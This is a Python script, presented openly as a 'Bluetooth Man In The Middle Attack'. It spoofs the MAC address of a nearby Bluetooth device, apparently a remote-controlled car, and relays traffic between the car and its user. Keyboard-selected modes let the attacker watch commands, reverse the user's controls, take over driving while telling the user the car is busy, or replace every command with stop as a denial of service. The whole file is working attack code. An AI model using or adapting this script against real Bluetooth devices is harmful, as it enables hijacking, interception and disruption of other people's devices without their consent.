import time
import subprocess
from bluetooth import *
from pynput import keyboard
from threading import Thread

mode = 1

def on_press(key):
    try: 
        k = key.char # single-char keys
    except: 
        k = key.name # other keys
    if key == keyboard.Key.esc: 
        return False # stop listener

    global mode

    if key == keyboard.Key.f2:
        print("Mode has been changed to 'monitor'")
        mode = 1
    elif key == keyboard.Key.f3:
        print("Mode has been changed to 'reverse'")
        mode = 2
    elif key == keyboard.Key.f4:
        print("Mode has been changed to 'take over'")
        mode = 3
    elif key == keyboard.Key.f5:
        print("Mode has been changed to 'DOS'")
        mode = 4

# Client stub
def during_takeover():
    global client_socket
    global mode

    while mode == 3:
        # add timeout here
        client_socket.recv(1024)
        client_socket.send("Car is busy at the moment ^_^")

# MAIN program starts here

print("Bluetooth Man In The Middle Attack!")

# Identify which bluetooth adapter can change it's mac address
subprocess.Popen(['service', 'bluetooth', 'start'], stdout=subprocess.PIPE)
subprocess.Popen(['hciconfig', 'hci0', 'up'], stdout=subprocess.PIPE)
proc = subprocess.Popen(['hciconfig', 'hci1', 'up'], stdout=subprocess.PIPE)
time.sleep(1)

adapter = raw_input("Which bluetooth adapter is spoofed? ")
subprocess.Popen(['hciconfig', adapter, 'down'], stdout=subprocess.PIPE)
time.sleep(1)

# Scan for discoverable bluetooth devices
nearby_devices = {}
while len(nearby_devices) == 0:
    print("Performing inquiry...")
    nearby_devices = discover_devices(lookup_names = True)
print("found %d devices" % len(nearby_devices))
num = 1
for name, addr in nearby_devices:
    print("%d) %s - %s" % (num, addr, name))
    num = num + 1
# Select what device we want to spoof
device = input("\nWhat device do you want to spoof (car)? ")
(car_mac, car_name) = nearby_devices[device-1]

# deactivate spoofed adapter until we manage to pair with the car
time.sleep(2)

# Pair to the car

# Socket for communication with the car (client)
car_socket=BluetoothSocket( RFCOMM )

# Socket to listen for user connection (server)
subprocess.Popen(['hciconfig', adapter, 'up'], stdout=subprocess.PIPE)
time.sleep(2)
user_socket=BluetoothSocket( RFCOMM )

# Attempt to connect to the car on port 1
option = 'y'
while option == 'y' or option == 'Y':
    try:
        car_socket.connect((car_mac, 1))
        break
    except BluetoothError as err:
        print("Could not connect to the specified MAC address!")
        option = raw_input("Make sure you are paired to the device, enter 'y' to retry: ")
        continue

# If we didn't manage to connect to the car - exit
if option != 'y' and option != 'Y':
    print("Could not establish communication with the specified device, exiting")
    exit()

# Once we connected to the car - enable spoofed adapter, 
# so the next device trying to connect to spoofed 
# MAC address will connect to us
proc = subprocess.Popen(['hciconfig', adapter, 'up'], stdout=subprocess.PIPE)

# Listen for incoming connection from the user on port 1
user_socket.bind(("", 1 ))
user_socket.listen(1)
print("Waiting for user to connect!")
# Accept connection from the user
global client_socket
client_socket, address = user_socket.accept()

print("Everything is setup!")
print("Use F2, F3 and F4 keys to switch between modes:")
print("F2 (default) - monitor mode")
print("F3 - reverse controls")
print("F4 - take over")
print("F5 - DOS")
lis = keyboard.Listener(on_press=on_press)
lis.start() # start to listen on a separate thread

thread = Thread(target = during_takeover, args = ())
# While we are running
while True:
    if mode == 3:
        while mode == 3:
            print("Avaliable commands:")
            print("'f' - forward")
            print("'s' - stop")
            print("'r' - rotate right")
            print("'l' - rotate left")
            print("'b' - back")
            cmd = raw_input("What do we want to send to the car? ")
            car_socket.send(cmd)
            car_output = car_socket.recv(1024)
            print("Reply from the car: [%s]" % car_output)
        thread.join()
    else:
        # Attempt to recieve data from user
        #try:
        data = client_socket.recv(1024)
        #except BluetoothError as err:
        #    print("User disconnected, listening for a new connection...")
        #    client_socket, address = user_socket.accept()
        #    data = client_socket.recv(1024)
        print("User sent: [%s]" % data)

        if mode == 4:
            print("Replacing data with stop")
            data = 's'
            car_socket.send(data)
            car_output = car_socket.recv(1024)
            client_socket.send(car_output)
            continue

        # Take over mode
        if mode == 3:
            thread = Thread(target = during_takeover, args = ())
            print("Entering mode 3 after user sends next command")
            data = 's'
            car_socket.send(data)
            car_output = car_socket.recv(1024)
            client_socket.send(car_output)
            thread.start()
            continue

        # Reverse controls if mode 2 is selected
        if mode == 2:
            print("Reversing controlls...")
            if data == 'f':
                data = 'b'
            elif data == 'b':
                data = 'f'
            elif data == 'r':
                data = 'l'
            elif data == 'l':
                data = 'r'
        
        print("Sending data to the car: [%s]" % data)
        car_socket.send(data)

        # Attempt to recieve reply from the car

        #while True:
        #    try:
        car_output = car_socket.recv(1024)
        print("Car replied: [%s]" % car_output)
        #    except BluetoothError as err:
        #        print("Lost connection to the car, attempting to reconnect...")
        #        car_socket.connect((car_mac, 1))
        #        continue
        #    break

        #filter data going to the user

        # Forward car's reply back to the user
        client_socket.send(car_output)

running = False
lis.join() # no this if main thread is polling self.keys
client_socket.close()
user_socket.close()
car_socket.close()
